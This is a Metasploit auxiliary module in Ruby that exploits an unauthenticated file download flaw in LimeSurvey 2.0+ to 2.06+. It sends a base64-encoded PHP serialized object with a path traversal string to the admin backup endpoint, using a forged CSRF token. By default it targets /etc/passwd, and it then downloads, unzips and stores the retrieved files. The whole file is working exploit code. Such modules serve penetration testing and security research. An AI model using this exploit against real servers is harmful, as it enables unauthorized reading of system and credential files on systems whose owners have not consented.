##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# for extracting files
require 'zip'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Limesurvey Unauthenticated File Download",
      'Description'    => %q{
        This module exploits an unauthenticated file download vulnerability
        in limesurvey between 2.0+ and 2.06+ Build 151014. The file is downloaded
        as a ZIP and unzipped automatically, thus binary files can be downloaded.
      },
      'Author'         =>
        [
          'Pichaya Morimoto', # Vulnerability Discovery
          'Christian Mehlmauer' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20151022-0_Lime_Survey_multiple_critical_vulnerabilities_v10.txt'],
          ['URL', 'https://www.limesurvey.org/en/blog/76-limesurvey-news/security-advisories/1836-limesurvey-security-advisory-10-2015'],
          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/compare/2.06_plus_151014...2.06_plus_151016?w=1']
        ],
      'DisclosureDate' => 'Oct 12 2015'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, "The base path to the limesurvey installation", '/']),
        OptString.new('FILEPATH', [true, 'Path of the file to download', '/etc/passwd']),
        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 15])
      ])
  end

  def filepath
    datastore['FILEPATH']
  end

  def traversal_depth
    datastore['TRAVERSAL_DEPTH']
  end

  def payload
    traversal = "/.." * traversal_depth
    file = "#{traversal}#{filepath}"
    serialized = 'a:1:{i:0;O:16:"CMultiFileUpload":1:{s:4:"file";s:' + file.length.to_s + ':"' + file + '";}}'
    Rex::Text.encode_base64(serialized)
  end

  def unzip_file(zipfile)
    zip_data = Hash.new
    begin
      Zip::File.open_buffer(zipfile) do |filezip|
        filezip.each do |entry|
          zip_data[::File.expand_path(entry.name)] = filezip.read(entry)
        end
      end
    rescue Zip::Error => e
      print_error("Error extracting ZIP: #{e}")
    end
    return zip_data
  end

  def run
    csrf_token = Rex::Text.rand_text_alpha(10)

    vars_post = {
      'YII_CSRF_TOKEN' => csrf_token,
      'destinationBuild' => Rex::Text.rand_text_alpha(5),
      'datasupdateinfo' => payload
    }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'index.php', 'admin', 'update', 'sa', 'backup'),
      'cookie' => "YII_CSRF_TOKEN=#{csrf_token}",
      'vars_post' => vars_post
    })

    if res && res.code == 200 && res.body && res.body.include?('Download this file')
      match = res.body.match(%r{<div class="updater-background">\s+<p class="success " style="text-align: left;">\s+<strong>[^<]+</strong>\s+<br/>\s+([^<]+)<br/>\s+<a class="btn btn-success" href="([^"]+)" title="Download this file">Download this file</a>})
      if match
        local_path = match[1]
        download_url = match[2]
        print_status("File saved to #{local_path}")
        print_status("Downloading backup from URL #{download_url}")

        res = send_request_cgi({
          'method' => 'GET',
          'uri' => download_url
        })

        if res && res.code == 200
          unzipped = unzip_file(res.body)

          unzipped.each do |filename, content|
            print_good("Filename: #{filename}")
            print_good(content)

            path = store_loot(
              'limesurvey.http',
              'application/octet-stream',
              rhost,
              content,
              filename
            )
            print_good("File saved in: #{path}")
          end
        else
          print_error('Failed to download file')
        end
      else
        print_error('Failed to download file')
      end
    else
      print_error('Failed to download file')
    end
  end
end
